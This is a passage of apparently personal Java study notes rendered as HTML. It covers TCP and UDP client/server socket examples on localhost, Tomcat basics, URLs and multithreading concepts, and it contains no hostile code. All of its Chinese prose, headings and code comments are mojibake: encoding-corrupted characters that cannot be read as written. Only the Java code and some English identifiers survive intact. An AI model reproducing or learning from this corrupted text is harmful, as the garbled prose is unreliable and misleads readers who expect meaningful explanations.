<li>ä¸ç®¡æœ‰æ²¡æœ‰å‡†å¤‡å¥½ï¼Œéƒ½å¯ä»¥å‘ç»™ä½ </li>
<li>DDOSï¼šæ´ªæ°´æ”»å‡»ï¼ å‘åƒåœ¾åŒ… å µå¡çº¿è·¯ ï¼ˆé¥±å’Œæ”»å‡»ï¼‰</li>
</ul>
</li>
</ul>
<h3 id="6-TCP"><a href="#6-TCP" class="headerlink" title="6.TCP"></a>6.TCP</h3><blockquote>
<p><strong>å…ˆå¯åŠ¨æœåŠ¡ç«¯ï¼Œå†å¯åŠ¨å®¢æˆ·ç«¯ï¼ï¼ï¼ï¼</strong></p>
</blockquote>
<p><strong>å®¢æˆ·ç«¯</strong></p>
<ul>
<li>è¿æ¥æœåŠ¡å™¨ Socket</li>
<li>å‘é€æ¶ˆæ¯</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPClientDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">accept</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1.è¦çŸ¥é“æœåŠ¡å™¨çš„åœ°å€</span></span><br><span class="line">            <span class="type">InetAddress</span> <span class="variable">inetAddress</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">            <span class="comment">// 2.åˆ›å»ºä¸€ä¸ªsocketé“¾æ¥</span></span><br><span class="line">            accept = <span class="keyword">new</span> <span class="title class_">Socket</span>(inetAddress,port);</span><br><span class="line">            <span class="comment">// 3.å‘é€ä¿¡æ¯IOæµ</span></span><br><span class="line">            os = accept.getOutputStream();</span><br><span class="line">            os.write(<span class="string">&quot;å°±è¿™å§ï¼Œä»€ä¹ˆé¬¼ï¼Ÿå’¿å‘€å’¿å‘€å“Ÿå’¿å‘€å’¿å‘€å“Ÿ&quot;</span>.getBytes());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// å…³é—­èµ„æº</span></span><br><span class="line">            <span class="keyword">if</span>(os != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    os.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(accept != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    accept.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>æœåŠ¡å™¨ç«¯</strong></p>
<ul>
<li>å»ºç«‹æœåŠ¡çš„ç«¯å£ ServerSocket</li>
<li>ç­‰å¾…çš„ç”¨æˆ·çš„è¿æ¥ accept</li>
<li>æ¥æ”¶ç”¨æˆ·çš„æ¶ˆæ¯</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TCPServerDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 1.æœ‰ä¸€ä¸ªåœ°å€</span></span><br><span class="line">            serverSocket = <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">9999</span>);</span><br><span class="line">            <span class="comment">// 2.ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥è¿‡æ¥</span></span><br><span class="line">            socket = serverSocket.accept();</span><br><span class="line">            <span class="comment">// 3.è¯»å–å®¢æˆ·ç«¯çš„æ¶ˆæ¯</span></span><br><span class="line">            is = socket.getInputStream();</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">           //å¼ƒç”¨ ä¼šæœ‰ä¸­æ–‡ä¹±ç </span></span><br><span class="line"><span class="comment">           byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="comment">            int len = 0;</span></span><br><span class="line"><span class="comment">            while ((len = is.read(bytes)) != -1)&#123;</span></span><br><span class="line"><span class="comment">                String s = new String(buffer,0,len);</span></span><br><span class="line"><span class="comment">                System.out.println(s);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç®¡é“æµ</span></span><br><span class="line">            baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// å…³é—­èµ„æº</span></span><br><span class="line">            <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    baos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    is.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (serverSocket != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    serverSocket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/51f7dcfcdb8f0cd022e3ccd81021033a--b1f8--image-20241002194149715.png" alt="image-20241002194149715"></p>
<h4 id="2-åˆè¯†Tomcat"><a href="#2-åˆè¯†Tomcat" class="headerlink" title="2.åˆè¯†Tomcat"></a>2.åˆè¯†Tomcat</h4><blockquote>
<p>Tomcatä¹±ç ï¼š conf\logging.properties æŠŠUTF-8æ”¹ä¸ºGBK</p>
</blockquote>
<p>æœåŠ¡ç«¯</p>
<ul>
<li>è‡ªå®šä¹‰ S</li>
<li>TomcatæœåŠ¡å™¨ S ï¼šJavaåå°å¼€å‘</li>
</ul>
<p>å®¢æˆ·ç«¯</p>
<ul>
<li>è‡ªå®šä¹‰ C</li>
<li>æµè§ˆå™¨ B</li>
</ul>
<h3 id="7-UDP"><a href="#7-UDP" class="headerlink" title="7.UDP"></a>7.UDP</h3><p> å‘çŸ­ä¿¡ï¼šä¸ç”¨è¿æ¥ï¼Œéœ€è¦çŸ¥é“å¯¹æ–¹çš„åœ°å€ </p>
<h4 id="1-å‘é€æ¶ˆæ¯"><a href="#1-å‘é€æ¶ˆæ¯" class="headerlink" title="1.å‘é€æ¶ˆæ¯"></a>1.å‘é€æ¶ˆæ¯</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPClientDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 1ã€å»ºç«‹ä¸€ä¸ªSocket</span></span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">datagramSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">        <span class="comment">// 2ã€å»ºä¸ªåŒ…</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;UDPæœåŠ¡å™¨ã€‚ä½ å¥½ï¼&quot;</span>;</span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">byName</span> <span class="operator">=</span> InetAddress.getByName(<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">9090</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ•°æ®ã€æ•°æ®çš„é•¿åº¦èµ·å§‹ã€è¦å‘é€ç»™è°</span></span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">datagramPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(msg.getBytes(), msg.getBytes().length, byName, port);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3ã€ å‘é€åŒ…</span></span><br><span class="line">        datagramSocket.send(datagramPacket);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4ã€ å…³é—­æµ</span></span><br><span class="line">        datagramSocket.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UDPServerDemo011</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//1ã€ å¼€æ”¾ç«¯å£</span></span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">datagramSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(<span class="number">9090</span>);</span><br><span class="line">        <span class="comment">//2 ã€æ¥å—æ•°æ®åŒ…</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">datagramPacket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(bytes, bytes.length);</span><br><span class="line"></span><br><span class="line">        datagramSocket.receive(datagramPacket);</span><br><span class="line">        System.out.println(datagramPacket.getAddress().getHostAddress());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(datagramPacket.getData()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3ã€å…³é—­è¿æ¥</span></span><br><span class="line">        datagramSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/5470eb5dfe09d3ef6743df8efc80e6d6--759e--image-20241002195004190.png" alt="image-20241002195004190"></p>
<ul>
<li>é•¿ä¸²ä¹±ç æ˜¯æ¥å—ä½¿ç”¨çš„1024çš„byte</li>
</ul>
<h3 id="8-URL"><a href="#8-URL" class="headerlink" title="8.URL"></a>8.URL</h3><ul>
<li><p><a href="https://www.baidu.com/">https://www.baidu.com</a></p>
</li>
<li><p>ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼šå®šä½äº’è”ç½‘ä¸Šçš„æŸä¸€ä¸ªèµ„æº</p>
</li>
<li><p>DNSåŸŸåè§£æ <a href="http://www.baidu.com/">www.baidu.com</a> â€”&gt; xxx.xxx.xxxx.xxxâ€¦xxx</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">åè®®ï¼š//ipåœ°å€ï¼šç«¯å£å·/é¡¹ç›®å/èµ„æº</span><br></pre></td></tr></table></figure>

<h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><h3 id="1ã€çº¿ç¨‹å®ç°"><a href="#1ã€çº¿ç¨‹å®ç°" class="headerlink" title="1ã€çº¿ç¨‹å®ç°"></a>1ã€çº¿ç¨‹å®ç°</h3><h4 id="1-çº¿ç¨‹çš„åˆ›å»º-ä¸‰ç§æ–¹å¼"><a href="#1-çº¿ç¨‹çš„åˆ›å»º-ä¸‰ç§æ–¹å¼" class="headerlink" title="1.çº¿ç¨‹çš„åˆ›å»º(ä¸‰ç§æ–¹å¼)"></a>1.çº¿ç¨‹çš„åˆ›å»º(ä¸‰ç§æ–¹å¼)</h4><blockquote>
<p>1.1 ç»§æ‰¿Threadç±»<strong>ï¼ˆé‡è¦ï¼‰</strong></p>
<ul>
<li>è‡ªå®šä¹‰çº¿ç¨‹ç±»ç»§æ‰¿<code>Thread</code>ç±»ï¼›</li>
<li>é‡å†™<code>run()</code>æ–¹æ³•ï¼Œç¼–å†™çº¿ç¨‹æ‰§è¡Œä½“ï¼›</li>
<li>åˆ›å»ºçº¿ç¨‹å¯¹è±¡ï¼Œè°ƒç”¨<code>start()</code>æ–¹æ³•å¯åŠ¨çº¿ç¨‹ã€‚</li>
</ul>
</blockquote>
<ul>
<li>å¯ä»¥ç›´æ¥ä½¿ç”¨lamboè¡¨è¾¾å¼å¼€å¯å¤šçº¿ç¨‹</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName());</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a93581cde7b6ff6b5e0f388d3dc9bcbb--48bf--image-20241002200418140.png" alt="image-20241002200418140"></p>
<blockquote>
<p>1.2 å®ç°Runnableæ¥å£</p>
<ul>
<li><strong>æ¨èä½¿ç”¨Runnableå¯¹è±¡,å› ä¸ºJavaå•ç»§æ‰¿çš„å±€é™æ€§</strong>ï¼›</li>
<li>è‡ªå®šä¹‰çº¿ç¨‹ç±»å®ç°<code>Runnable</code>æ¥å£ï¼›</li>
<li>å®ç°<code>run()</code>æ–¹æ³•,ç¼–å†™çº¿ç¨‹æ‰§è¡Œä½“ï¼›</li>
<li>åˆ›å»ºçº¿ç¨‹å¯¹è±¡,è°ƒç”¨<code>start()</code>æ–¹æ³•å¯åŠ¨å¯¹è±¡ã€‚</li>
</ul>
</blockquote>
<blockquote>
<p>1.3 å®ç°Callableæ¥å£ï¼ˆäº†è§£ï¼‰</p>
<ul>
<li>å®ç°Callableæ¥å£ï¼Œéœ€è¦è¿”å›å€¼ç±»å‹ï¼›</li>
<li>é‡å†™callæ–¹æ³•ï¼Œéœ€è¦æŠ›å‡ºå¼‚å¸¸ï¼›</li>
<li>åˆ›å»ºç›®æ ‡å¯¹è±¡ï¼›</li>
<li>åˆ›å»ºæ‰§è¡ŒæœåŠ¡ï¼šExecutorService ser &#x3D; Executors.newFixedThreadPool(1);</li>
<li>æäº¤æ‰§è¡Œï¼šFuture result1 &#x3D; ser.submit(11);</li>
<li>è·å–ç»“æœï¼šboolean r1 &#x3D; result1.get();</li>
<li>å…³é—­æœåŠ¡ï¼šser.shutdownNow();</li>
</ul>
</blockquote>
<h4 id="2-é™æ€ä»£ç†"><a href="#2-é™æ€ä»£ç†" class="headerlink" title="2.é™æ€ä»£ç†"></a>2.é™æ€ä»£ç†</h4><p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/0f21687c7dae4f514872b6eca338b761--d6f5--image-20241006132520284.png" alt="image-20241006132520284"></p>
<ul>
<li>æ€»ç»“<ul>
<li>çœŸå®å¯¹è±¡å’Œä»£ç†å¯¹è±¡éƒ½è¦å®ç°ä¸€ä¸ªæ¥å£ï¼›</li>
<li>ä»£ç†å¯¹è±¡è¦ä»£ç†çœŸå®è§’è‰²ã€‚</li>
</ul>
</li>
<li>å¥½å¤„<ul>
<li>ä»£ç†å¯¹è±¡å¯ä»¥åšå¾ˆå¤šçœŸå®å¯¹è±¡åšä¸äº†çš„äº‹æƒ…ï¼›</li>
<li>çœŸå®å¯¹è±¡ä¸“æ³¨åšè‡ªå·±çš„äº‹ã€‚</li>
</ul>
</li>
</ul>
<h4 id="3-Lambdaè¡¨è¾¾å¼"><a href="#3-Lambdaè¡¨è¾¾å¼" class="headerlink" title="3.Lambdaè¡¨è¾¾å¼"></a>3.Lambdaè¡¨è¾¾å¼</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/bfe245ecd11b4f7efae76acd496e5dfb--4306--image-20241006134641276.png" alt="image-20241006134641276"></p>
<ul>
<li>Î» å¸Œè…Šå­—æ¯è¡¨ä¸­æ’åºç¬¬åä¸€ä½çš„å­—æ¯ï¼Œè‹±è¯­åç§°ä¸º Lambdaï¼›</li>
<li>é¿å…åŒ¿åå†…éƒ¨ç±»å®šä¹‰è¿‡å¤šï¼›</li>
<li>å…¶å®è´¨å±äºå‡½æ•°å¼ç¼–ç¨‹çš„æ¦‚å¿µï¼›</li>
<li>å»æ‰äº†ä¸€å †æ²¡æœ‰æ„ä¹‰çš„ä»£ç ,åªç•™ä¸‹æ ¸å¿ƒé€»è¾‘ã€‚</li>
</ul>
<blockquote>
<ul>
<li><p>(params)-&gt; expression[è¡¨è¾¾å¼]</p>
</li>
<li><p>(params) -&gt; statement[è¯­å¥]</p>
</li>
<li><p>(params)-&gt; {statements}</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a -&gt; System.out.println(<span class="string">&quot;i like lamda--&gt;&quot;</span>+a)</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>new Thread (()-&gt;System.out.println(â€œå¤šçº¿ç¨‹å­¦ä¹ ã€‚ã€‚ã€‚ã€‚â€)).start()ï¼›</li>
<li>ç†è§£Functional Interface (å‡½æ•°å¼æ¥å£) æ˜¯å­¦ä¹ Java 8 lambdaè¡¨è¾¾å¼çš„å…³é”®</li>
</ul>
<blockquote>
<p>å‡½æ•°å¼æ¥å£çš„å®šä¹‰</p>
</blockquote>
<ul>
<li>ä»»ä½•æ¥å£ï¼Œå¦‚æœåªåŒ…å«å”¯ä¸€ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªå‡½æ•°å¼æ¥å£ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯¹äºå‡½æ•°å¼æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Lambdaè¡¨è¾¾å¼æ¥åˆ›å»ºè¯¥æ¥å£çš„å¯¹è±¡ã€‚</li>
</ul>
<h3 id="2ã€çº¿ç¨‹çŠ¶æ€"><a href="#2ã€çº¿ç¨‹çŠ¶æ€" class="headerlink" title="2ã€çº¿ç¨‹çŠ¶æ€"></a>2ã€çº¿ç¨‹çŠ¶æ€</h3><h4 id="1-ã€çº¿ç¨‹çš„äº”å¤§çŠ¶æ€"><a href="#1-ã€çº¿ç¨‹çš„äº”å¤§çŠ¶æ€" class="headerlink" title="1 ã€çº¿ç¨‹çš„äº”å¤§çŠ¶æ€"></a>1 ã€çº¿ç¨‹çš„äº”å¤§çŠ¶æ€</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/6aa70bdff9b7d0ccaab0fcbf9e43512a--8967--image-20241006142241243.png" alt="image-20241006142241243"></p>
<h4 id="2ã€çº¿ç¨‹æ–¹æ³•"><a href="#2ã€çº¿ç¨‹æ–¹æ³•" class="headerlink" title="2ã€çº¿ç¨‹æ–¹æ³•"></a>2ã€çº¿ç¨‹æ–¹æ³•</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/93e398a6d304d22f3e9508b65e5d7db1--1d19--image-20241006142255177.png" alt="image-20241006142255177"></p>
<blockquote>
<p>åœæ­¢çº¿ç¨‹</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/d789e0d2559d4467d10b7795d4a0f0b5--118e--image-20241006142311833.png" alt="image-20241006142311833"></p>
<blockquote>
<p>çº¿ç¨‹ä¼‘çœ </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/9b372cb18be71db388e8ce1c20f00bb7--45cf--image-20241006142329579.png" alt="image-20241006142329579"></p>
<blockquote>
<p>çº¿ç¨‹ç¤¼è®©</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/3c5e2afce39776a9856aa0325ae2015b--8dfd--image-20241006142802266.png" alt="image-20241006142802266"></p>
<blockquote>
<p>çº¿ç¨‹æ’é˜Ÿ</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/a22edb7010caa4d6da813af49a570d10--683b--image-20241006142815613.png" alt="image-20241006142815613"></p>
<h4 id="3-çº¿ç¨‹çŠ¶æ€è§‚æµ‹"><a href="#3-çº¿ç¨‹çŠ¶æ€è§‚æµ‹" class="headerlink" title="3.çº¿ç¨‹çŠ¶æ€è§‚æµ‹"></a>3.çº¿ç¨‹çŠ¶æ€è§‚æµ‹</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/4558c3a3bcf24243d562cb6f6bc4fb81--e402--image-20241006142842061.png" alt="image-20241006142842061"></p>
<h4 id="4ã€çº¿ç¨‹ä¼˜å…ˆçº§"><a href="#4ã€çº¿ç¨‹ä¼˜å…ˆçº§" class="headerlink" title="4ã€çº¿ç¨‹ä¼˜å…ˆçº§"></a>4ã€çº¿ç¨‹ä¼˜å…ˆçº§</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/6f685bd89884419530aaba4167ddb2a0--365d--image-20241006142859222.png" alt="image-20241006142859222"></p>
<h4 id="5ã€å®ˆæŠ¤çº¿ç¨‹"><a href="#5ã€å®ˆæŠ¤çº¿ç¨‹" class="headerlink" title="5ã€å®ˆæŠ¤çº¿ç¨‹"></a>5ã€å®ˆæŠ¤çº¿ç¨‹</h4><ul>
<li>çº¿ç¨‹åˆ†ä¸º<strong>ç”¨æˆ·çº¿ç¨‹</strong>å’Œ<strong>å®ˆæŠ¤çº¿ç¨‹</strong>ï¼›</li>
<li>è™šæ‹Ÿæœºå¿…é¡»ç¡®ä¿ç”¨æˆ·çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼›</li>
<li>è™šæ‹Ÿæœºä¸ç”¨ç­‰å¾…å®ˆæŠ¤çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ï¼›</li>
<li>å¦‚ï¼Œåå°è®°å½•æ“ä½œæ—¥å¿—ï¼Œç›‘æ§å†…å­˜åƒåœ¾å›æ”¶ç­‰å¾…â€¦â€¦</li>
</ul>
<h3 id="3ã€çº¿ç¨‹åŒæ­¥"><a href="#3ã€çº¿ç¨‹åŒæ­¥" class="headerlink" title="3ã€çº¿ç¨‹åŒæ­¥"></a>3ã€çº¿ç¨‹åŒæ­¥</h3><h4 id="1-ä»‹ç»"><a href="#1-ä»‹ç»" class="headerlink" title="1.ä»‹ç»"></a>1.ä»‹ç»</h4><ul>
<li>**å¤šä¸ªçº¿ç¨‹æ“ä½œåŒä¸€ä¸ªèµ„æº **</li>
<li>å¹¶å‘ï¼šåŒä¸€ä¸ªå¯¹è±¡è¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶æ“ä½œ</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-06/d0acde08a8674b45418842b7d10eae38--d0c8--image-20241006143301494.png" alt="image-20241006143301494"></p>
<blockquote>
<p>çº¿ç¨‹åŒæ­¥ï¼š</p>
<ul>
<li>ç°å®ç”Ÿæ´»ä¸­æˆ‘ä»¬ä¼šé‡åˆ°â€œåŒâ€”ä¸ªèµ„æºï¼Œå¤šä¸ªäººéƒ½æƒ³ä½¿ç”¨â€çš„é—®é¢˜ï¼Œæ¯”å¦‚é£Ÿå ‚æ’é˜Ÿæ‰“é¥­ï¼Œæ¯ä¸ªäººéƒ½æƒ³åƒé¥­ï¼Œæœ€å¤©ç„¶çš„è§£æ±ºåŠæ³•å°±æ˜¯ï¼šæ’é˜Ÿï¼Œä¸€ä¸ªä¸ªæ¥ã€‚</li>
<li>å¤„ç†å¤šçº¿ç¨‹é—®é¢˜æ—¶ï¼Œå¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”æŸäº›çº¿ç¨‹è¿˜æƒ³ä¿®æ”¹è¿™ä¸ªå¯¹è±¡è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦çº¿ç¨‹åŒæ­¥ã€‚çº¿ç¨‹åŒæ­¥å…¶å®å°±æ˜¯ä¸€ç§ç­‰å¾…æœºåˆ¶ï¼Œå¤šä¸ªéœ€è¦åŒæ—¶è®¿é—®æ­¤å¯¹è±¡çš„çº¿ç¨‹è¿›å…¥è¿™ä¸ª&#x3D;&#x3D;å¯¹è±¡çš„ç­‰å¾…æ± å½¢&#x3D;&#x3D;æˆé˜Ÿåˆ—ï¼Œç­‰å¾…å‰é¢çº¿ç¨‹ä½¿ç”¨å®Œæ¯•ï¼Œä¸‹ä¸€ä¸ªçº¿ç¨‹å†ä½¿ç”¨ã€‚</li>
</ul>
</blockquote>
<ul>
<li>é˜Ÿåˆ—å’Œé”</li>
</ul>
<blockquote>
<p>çº¿ç¨‹åŒæ­¥ï¼š</p>
<ul>
